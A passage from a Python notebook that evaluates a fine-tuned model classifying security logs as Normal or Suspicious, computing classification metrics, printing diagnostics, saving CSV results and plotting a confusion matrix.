    "# FIXED: Extract status labels (Normal/Suspicious) instead of just MITRE IDs\n",
    "y_true_status = [extract_status_label(r['expected']) for r in results]\n",
    "y_pred_status = [extract_status_label(r['predicted']) for r in results]\n",
    "\n",
    "print(\"=\"*80)\n",
    "print(\"üéØ STATUS CLASSIFICATION METRICS (Normal vs Suspicious)\")\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "# Get unique status labels\n",
    "unique_status_labels = sorted(list(set(y_true_status + y_pred_status)))\n",
    "print(f\"üìã Status labels found: {unique_status_labels}\\n\")\n",
    "\n",
    "# Print label distribution\n",
    "print(f\"Expected label distribution:\")\n",
    "print(f\"  {Counter(y_true_status)}\\n\")\n",
    "print(f\"Predicted label distribution:\")\n",
    "print(f\"  {Counter(y_pred_status)}\\n\")\n",
    "\n",
    "# Calculate status classification metrics\n",
    "status_accuracy = accuracy_score(y_true_status, y_pred_status)\n",
    "status_precision_macro = precision_score(y_true_status, y_pred_status, average='macro', zero_division=0)\n",
    "status_precision_weighted = precision_score(y_true_status, y_pred_status, average='weighted', zero_division=0)\n",
    "status_recall_macro = recall_score(y_true_status, y_pred_status, average='macro', zero_division=0)\n",
    "status_recall_weighted = recall_score(y_true_status, y_pred_status, average='weighted', zero_division=0)\n",
    "status_f1_macro = f1_score(y_true_status, y_pred_status, average='macro', zero_division=0)\n",
    "status_f1_weighted = f1_score(y_true_status, y_pred_status, average='weighted', zero_division=0)\n",
    "\n",
    "print(\"üéØ STATUS CLASSIFICATION OVERALL METRICS:\")\n",
    "print(f\"   Accuracy:             {status_accuracy:.4f} ({status_accuracy*100:.2f}%)\")\n",
    "print(f\"\\n   Precision (Macro):    {status_precision_macro:.4f}\")\n",
    "print(f\"   Precision (Weighted): {status_precision_weighted:.4f}\")\n",
    "print(f\"\\n   Recall (Macro):       {status_recall_macro:.4f}\")\n",
    "print(f\"   Recall (Weighted):    {status_recall_weighted:.4f}\")\n",
    "print(f\"\\n   F1-Score (Macro):     {status_f1_macro:.4f}\")\n",
    "print(f\"   F1-Score (Weighted):  {status_f1_weighted:.4f}\")\n",
    "\n",
    "# Detailed classification report\n",
    "print(f\"\\nüìä DETAILED STATUS CLASSIFICATION REPORT:\")\n",
    "print(classification_report(y_true_status, y_pred_status, zero_division=0))\n",
    "\n",
    "# Status confusion matrix\n",
    "status_conf_matrix = confusion_matrix(y_true_status, y_pred_status, labels=unique_status_labels)\n",
    "\n",
    "# Calculate word-level metrics (from previous evaluation)\n",
    "avg_partial_match = np.mean(partial_match_scores)\n",
    "avg_f1_word = np.mean(f1_scores)\n",
    "exact_match_accuracy = exact_matches / len(eval_samples)\n",
    "\n",
    "print(f\"\\n\" + \"=\"*80)\n",
    "print(\"üìù WORD-LEVEL SIMILARITY METRICS:\")\n",
    "print(\"=\"*80)\n",
    "print(f\"   Exact Match Accuracy: {exact_match_accuracy:.4f} ({exact_match_accuracy*100:.2f}%)\")\n",
    "print(f\"   Avg Partial Match:    {avg_partial_match:.4f}\")\n",
    "print(f\"   Avg F1 (Word-level):  {avg_f1_word:.4f}\")\n",
    "\n",
    "# Store metrics for later use\n",
    "accuracy = status_accuracy\n",
    "precision_macro = status_precision_macro\n",
    "precision_weighted = status_precision_weighted\n",
    "recall_macro = status_recall_macro\n",
    "recall_weighted = status_recall_weighted\n",
    "f1_macro = status_f1_macro\n",
    "f1_weighted = status_f1_weighted\n",
    "unique_labels = unique_status_labels\n",
    "conf_matrix = status_conf_matrix\n",
    "y_true = y_true_status\n",
    "y_pred = y_pred_status\n",
    "\n",
    "print(f\"\\n‚úÖ Metrics calculated successfully!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:42:31.054498Z",
     "iopub.status.busy": "2026-01-06T16:42:31.054206Z",
     "iopub.status.idle": "2026-01-06T16:42:31.061250Z",
     "shell.execute_reply": "2026-01-06T16:42:31.060671Z",
     "shell.execute_reply.started": "2026-01-06T16:42:31.054464Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# INSPECTION: Manual review of predictions\n",
    "print(\"\\n\" + \"=\"*80)\n",
    "print(\"üîç MANUAL INSPECTION OF PREDICTIONS\")\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "print(\"This helps you see what the model is actually generating.\\n\")\n",
    "\n",
    "# Analyze all predictions first\n",
    "unknown_count = sum(1 for r in results if extract_status_label(r['predicted']) == 'UNKNOWN')\n",
    "normal_count = sum(1 for r in results if extract_status_label(r['predicted']) == 'NORMAL')\n",
    "suspicious_count = sum(1 for r in results if extract_status_label(r['predicted']) == 'SUSPICIOUS')\n",
    "\n",
    "print(\"=\"*80)\n",
    "print(\"‚ö†Ô∏è MODEL OUTPUT ANALYSIS\")\n",
    "print(\"=\"*80)\n",
    "print(f\"Total predictions: {len(results)}\")\n",
    "print(f\"  NORMAL predictions: {normal_count}\")\n",
    "print(f\"  SUSPICIOUS predictions: {suspicious_count}\")\n",
    "print(f\"  UNKNOWN predictions: {unknown_count}\")\n",
    "\n",
    "if unknown_count > len(results) * 0.5:\n",
    "    print(f\"\\nüö® WARNING: {unknown_count}/{len(results)} predictions are UNKNOWN!\")\n",
    "    print(\"   This means the model is NOT generating the expected format:\")\n",
    "    print(\"   'Status: Normal' or 'Status: Suspicious'\")\n",
    "    print(\"\\n   The model is likely BROKEN or NOT PROPERLY TRAINED!\")\n",
    "    print(\"\\n   Common causes:\")\n",
    "    print(\"   1. Model didn't learn the task (too few epochs, wrong data)\")\n",
    "    print(\"   2. Input is being truncated (logs too long for 512 tokens)\")\n",
    "    print(\"   3. Generation parameters are wrong\")\n",
    "    print(\"   4. Prompt format mismatch between training and evaluation\")\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "# Show 5 examples - prioritize showing broken ones first\n",
    "broken_indices = [i for i, r in enumerate(results) if extract_status_label(r['predicted']) == 'UNKNOWN']\n",
    "working_indices = [i for i, r in enumerate(results) if extract_status_label(r['predicted']) != 'UNKNOWN']\n",
    "\n",
    "import random\n",
    "random.seed(42)\n",
    "\n",
    "if broken_indices:\n",
    "    sample_indices = broken_indices[:3]  # Show 3 broken examples\n",
    "    if working_indices:\n",
    "        sample_indices += random.sample(working_indices, min(2, len(working_indices)))  # Add 2 working ones if any\n",
    "else:\n",
    "    sample_indices = random.sample(range(len(results)), min(5, len(results)))\n",
    "\n",
    "for idx in sample_indices:\n",
    "    result = results[idx]\n",
    "    pred_status = extract_status_label(result['predicted'])\n",
    "    exp_status = extract_status_label(result['expected'])\n",
    "    \n",
    "    print(f\"\\n{'='*80}\")\n",
    "    print(f\"Example {idx + 1}:\")\n",
    "    \n",
    "    print(f\"\\nüìù EXPECTED OUTPUT:\")\n",
    "    print(f\"{result['expected']}\")\n",
    "    \n",
    "    print(f\"\\nü§ñ MODEL PREDICTED:\")\n",
    "    if len(result['predicted']) > 500:\n",
    "        print(f\"{result['predicted'][:500]}... [TRUNCATED - {len(result['predicted'])} chars total]\")\n",
    "    else:\n",
    "        print(f\"{result['predicted']}\")\n",
    "    \n",
    "    print(f\"\\nüìä STATUS: Expected={exp_status}, Predicted={pred_status}\")\n",
    "    print(f\"‚úì Match: {exp_status == pred_status}\")\n",
    "    \n",
    "    if pred_status == 'UNKNOWN':\n",
    "        print(\"\\n‚ö†Ô∏è BROKEN: Model output doesn't contain 'Status:' - model is not working!\")\n",
    "\n",
    "print(f\"\\n{'='*80}\")\n",
    "print(\"üí° DIAGNOSTIC TIPS:\")\n",
    "print(\"   - Is the model following the expected format?\")\n",
    "print(\"   - Is it correctly identifying Normal vs Suspicious?\")\n",
    "print(\"   - Are the reasons/explanations coherent?\")\n",
    "print(\"\\n   If most predictions are UNKNOWN:\")\n",
    "print(\"   ‚Üí Model needs retraining with more epochs or better parameters\")\n",
    "print(\"   ‚Üí Check if prompt format matches training format\")\n",
    "print(\"   ‚Üí Try increasing max_length from 512 to 1024 or 2048\")\n",
    "print(\"=\"*80)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:42:31.062425Z",
     "iopub.status.busy": "2026-01-06T16:42:31.062122Z",
     "iopub.status.idle": "2026-01-06T16:42:31.075413Z",
     "shell.execute_reply": "2026-01-06T16:42:31.074806Z",
     "shell.execute_reply.started": "2026-01-06T16:42:31.062387Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Final Summary Report\n",
    "print(\"\\n\" + \"=\"*80)\n",
    "print(\"üéâ FINAL EVALUATION SUMMARY\")\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "print(f\"üìä Dataset Information:\")\n",
    "print(f\"   Total samples evaluated: {len(eval_samples):,}\")\n",
    "print(f\"   Evaluation time: {elapsed/60:.2f} minutes\")\n",
    "print(f\"   Time per sample: {elapsed/len(eval_samples):.2f} seconds\")\n",
    "\n",
    "print(f\"\\nüéØ Key Performance Metrics:\")\n",
    "print(f\"   ‚úì Overall Accuracy: {accuracy:.4f} ({accuracy*100:.2f}%)\")\n",
    "print(f\"   ‚úì Weighted Precision: {precision_weighted:.4f}\")\n",
    "print(f\"   ‚úì Weighted Recall: {recall_weighted:.4f}\")\n",
    "print(f\"   ‚úì Weighted F1-Score: {f1_weighted:.4f}\")\n",
    "\n",
    "print(f\"\\n{'='*80}\")\n",
    "print(\"‚úÖ Evaluation Complete!\")\n",
    "print(\"=\"*80)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:42:31.076470Z",
     "iopub.status.busy": "2026-01-06T16:42:31.076223Z",
     "iopub.status.idle": "2026-01-06T16:42:31.117077Z",
     "shell.execute_reply": "2026-01-06T16:42:31.116366Z",
     "shell.execute_reply.started": "2026-01-06T16:42:31.076449Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Save results to CSV\n",
    "print(\"üíæ Saving detailed results...\\n\")\n",
    "\n",
    "# Create detailed results DataFrame\n",
    "results_df = pd.DataFrame(results)\n",
    "results_df['true_label'] = y_true\n",
    "results_df['predicted_label'] = y_pred\n",
    "results_df['correct'] = results_df['true_label'] == results_df['predicted_label']\n",
    "\n",
    "# Save to CSV\n",
    "output_file = 'evaluation_results.csv'\n",
    "results_df.to_csv(output_file, index=False)\n",
    "print(f\"‚úÖ Detailed results saved to: {output_file}\")\n",
    "\n",
    "# Create metrics summary\n",
    "metrics_summary = {\n",
    "    'Metric': [\n",
    "        'Accuracy',\n",
    "        'Precision (Macro)',\n",
    "        'Precision (Weighted)',\n",
    "        'Recall (Macro)',\n",
    "        'Recall (Weighted)',\n",
    "        'F1-Score (Macro)',\n",
    "        'F1-Score (Weighted)',\n",
    "        'Exact Match Accuracy',\n",
    "        'Avg Partial Match',\n",
    "        'Avg F1 (Word-level)'\n",
    "    ],\n",
    "    'Score': [\n",
    "        accuracy,\n",
    "        precision_macro,\n",
    "        precision_weighted,\n",
    "        recall_macro,\n",
    "        recall_weighted,\n",
    "        f1_macro,\n",
    "        f1_weighted,\n",
    "        exact_match_accuracy,\n",
    "        avg_partial_match,\n",
    "        avg_f1_word\n",
    "    ]\n",
    "}\n",
    "\n",
    "metrics_df = pd.DataFrame(metrics_summary)\n",
    "metrics_file = 'metrics_summary.csv'\n",
    "metrics_df.to_csv(metrics_file, index=False)\n",
    "print(f\"‚úÖ Metrics summary saved to: {metrics_file}\")\n",
    "\n",
    "# Show sample of results\n",
    "print(\"\\nüìã Sample Results (First 10):\")\n",
    "display_cols = ['instruction', 'true_label', 'predicted_label', 'correct', 'f1_score']\n",
    "print(results_df[display_cols].head(10).to_string(index=False))\n",
    "\n",
    "print(f\"\\nüìä Correct Predictions: {results_df['correct'].sum()} / {len(results_df)} ({accuracy*100:.2f}%)\")\n",
    "print(f\"üìä Incorrect Predictions: {(~results_df['correct']).sum()} / {len(results_df)} ({(1-accuracy)*100:.2f}%)\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:42:31.118199Z",
     "iopub.status.busy": "2026-01-06T16:42:31.117979Z",
     "iopub.status.idle": "2026-01-06T16:42:31.448006Z",
     "shell.execute_reply": "2026-01-06T16:42:31.447267Z",
     "shell.execute_reply.started": "2026-01-06T16:42:31.118178Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Visualize Metrics Comparison\n",
    "print(\"üé® Creating metrics visualization...\\n\")\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "# Create metrics comparison bar chart\n",
    "fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(16, 6))\n",
    "\n",
    "# Plot 1: Overall Metrics\n",
    "metrics_names = ['Accuracy', 'Precision\\n(Weighted)', 'Recall\\n(Weighted)', 'F1-Score\\n(Weighted)']\n",
    "metrics_values = [accuracy, precision_weighted, recall_weighted, f1_weighted]\n",
    "\n",
    "bars1 = ax1.bar(metrics_names, metrics_values, color=['#2ecc71', '#3498db', '#e74c3c', '#f39c12'], alpha=0.8)\n",
    "ax1.set_ylabel('Score', fontsize=12, fontweight='bold')\n",
    "ax1.set_title('Overall Performance Metrics', fontsize=14, fontweight='bold')\n",
    "ax1.set_ylim([0, 1])\n",
    "ax1.axhline(y=0.5, color='gray', linestyle='--', alpha=0.3, label='50% baseline')\n",
    "ax1.grid(axis='y', alpha=0.3)\n",
    "\n",
    "# Add value labels on bars\n",
    "for bar in bars1:\n",
    "    height = bar.get_height()\n",
    "    ax1.text(bar.get_x() + bar.get_width()/2., height,\n",
    "             f'{height:.3f}\\n({height*100:.1f}%)',\n",
    "             ha='center', va='bottom', fontweight='bold')\n",
    "\n",
    "# Plot 2: Macro vs Weighted Metrics\n",
    "metrics_comparison = {\n",
    "    'Precision': [precision_macro, precision_weighted],\n",
    "    'Recall': [recall_macro, recall_weighted],\n",
    "    'F1-Score': [f1_macro, f1_weighted]\n",
    "}\n",
    "\n",
    "x = np.arange(len(metrics_comparison))\n",
    "width = 0.35\n",
    "\n",
    "bars2_1 = ax2.bar(x - width/2, [v[0] for v in metrics_comparison.values()], \n",
    "                   width, label='Macro', color='#3498db', alpha=0.8)\n",
    "bars2_2 = ax2.bar(x + width/2, [v[1] for v in metrics_comparison.values()], \n",
    "                   width, label='Weighted', color='#e74c3c', alpha=0.8)\n",
    "\n",
    "ax2.set_ylabel('Score', fontsize=12, fontweight='bold')\n",
    "ax2.set_title('Macro vs Weighted Metrics Comparison', fontsize=14, fontweight='bold')\n",
    "ax2.set_xticks(x)\n",
    "ax2.set_xticklabels(metrics_comparison.keys())\n",
    "ax2.set_ylim([0, 1])\n",
    "ax2.legend()\n",
    "ax2.grid(axis='y', alpha=0.3)\n",
    "\n",
    "# Add value labels\n",
    "for bars in [bars2_1, bars2_2]:\n",
    "    for bar in bars:\n",
    "        height = bar.get_height()\n",
    "        ax2.text(bar.get_x() + bar.get_width()/2., height,\n",
    "                 f'{height:.3f}',\n",
    "                 ha='center', va='bottom', fontsize=9)\n",
    "\n",
    "plt.tight_layout()\n",
    "plt.show()\n",
    "\n",
    "print(\"‚úÖ Metrics visualization created!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:42:31.449359Z",
     "iopub.status.busy": "2026-01-06T16:42:31.448977Z",
     "iopub.status.idle": "2026-01-06T16:42:31.475362Z",
     "shell.execute_reply": "2026-01-06T16:42:31.474595Z",
     "shell.execute_reply.started": "2026-01-06T16:42:31.449327Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Detailed Classification Report\n",
    "print(\"üìä DETAILED CLASSIFICATION REPORT\")\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "# Generate classification report\n",
    "report = classification_report(y_true, y_pred, labels=unique_labels, zero_division=0, output_dict=True)\n",
    "report_df = pd.DataFrame(report).transpose()\n",
    "\n",
    "# Display full report\n",
    "print(classification_report(y_true, y_pred, labels=unique_labels, zero_division=0))\n",
    "\n",
    "# Convert to DataFrame for better visualization\n",
    "print(\"\\nüìà Per-Class Metrics Summary:\")\n",
    "print(report_df.round(4))\n",
    "\n",
    "# Show best and worst performing classes\n",
    "if len(unique_labels) > 5:\n",
    "    print(\"\\nüèÜ TOP 5 BEST PERFORMING CLASSES (by F1-score):\")\n",
    "    class_metrics = report_df[report_df.index.str.startswith('T')].sort_values('f1-score', ascending=False)\n",
    "    print(class_metrics.head(5)[['precision', 'recall', 'f1-score', 'support']].round(4))\n",
    "    \n",
    "    print(\"\\n‚ö†Ô∏è TOP 5 WORST PERFORMING CLASSES (by F1-score):\")\n",
    "    print(class_metrics.tail(5)[['precision', 'recall', 'f1-score', 'support']].round(4))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:42:31.477779Z",
     "iopub.status.busy": "2026-01-06T16:42:31.477478Z",
     "iopub.status.idle": "2026-01-06T16:42:31.873773Z",
     "shell.execute_reply": "2026-01-06T16:42:31.872982Z",
     "shell.execute_reply.started": "2026-01-06T16:42:31.477755Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Visualize Confusion Matrix\n",
    "print(\"üé® Creating confusion matrix visualization...\\n\")\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "\n",
    "# Create figure\n",
    "fig, ax = plt.subplots(figsize=(max(12, len(unique_labels)), max(10, len(unique_labels))))\n",
    "\n",
    "# If too many labels, show a subset or use different visualization\n",
    "if len(unique_labels) > 20:\n",
    "    print(f\"‚ö†Ô∏è Large number of labels ({len(unique_labels)}). Showing top 20 most frequent...\")\n",
    "    \n",
    "    # Get top N most frequent labels\n",
    "    from collections import Counter\n",
    "    label_counts = Counter(y_true)\n",
    "    top_labels = [label for label, _ in label_counts.most_common(20)]\n",
    "    \n",
    "    # Filter confusion matrix for top labels\n",
    "    label_indices = [unique_labels.index(label) for label in top_labels]\n",
    "    conf_matrix_subset = conf_matrix[np.ix_(label_indices, label_indices)]\n",
    "    \n",
    "    # Plot subset\n",
    "    sns.heatmap(conf_matrix_subset, \n",
    "                annot=True, \n",
    "                fmt='d', \n",
    "                cmap='Blues',\n",
    "                xticklabels=top_labels,\n",
    "                yticklabels=top_labels,\n",
    "                ax=ax,\n",
    "                cbar_kws={'label': 'Count'})\n",
    "    \n",
    "    plt.title(f'Confusion Matrix (Top 20 Labels)\\nTotal Labels: {len(unique_labels)}', \n",
    "              fontsize=16, fontweight='bold', pad=20)\n",
    "else:\n",
    "    # Plot full confusion matrix\n",
    "    sns.heatmap(conf_matrix, \n",
    "                annot=True, \n",
    "                fmt='d', \n",
    "                cmap='Blues',\n",
    "                xticklabels=unique_labels,\n",
    "                yticklabels=unique_labels,\n",
    "                ax=ax,\n",
    "                cbar_kws={'label': 'Count'})\n",
    "    \n",
    "    plt.title('Confusion Matrix - All Labels', fontsize=16, fontweight='bold', pad=20)\n",
    "\n",
    "plt.xlabel('Predicted Label', fontsize=12, fontweight='bold')\n",
    "plt.ylabel('True Label', fontsize=12, fontweight='bold')\n",
    "plt.xticks(rotation=45, ha='right')\n",
    "plt.yticks(rotation=0)\n",
    "plt.tight_layout()\n",
    "plt.show()\n",
    "\n",
    "print(\"‚úÖ Confusion matrix visualization created!\")"
   ]
  }
 ],
 "metadata": {
  "kaggle": {
   "accelerator": "nvidiaTeslaT4",
   "dataSources": [
    {
     "datasetId": 9103706,
     "sourceId": 14266243,
     "sourceType": "datasetVersion"
    },
    {
     "datasetId": 9170369,
     "sourceId": 14361280,
     "sourceType": "datasetVersion"
    }
   ],
   "dockerImageVersionId": 31236,
   "isGpuEnabled": true,
   "isInternetEnabled": true,
   "language": "python",
   "sourceType": "notebook"
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
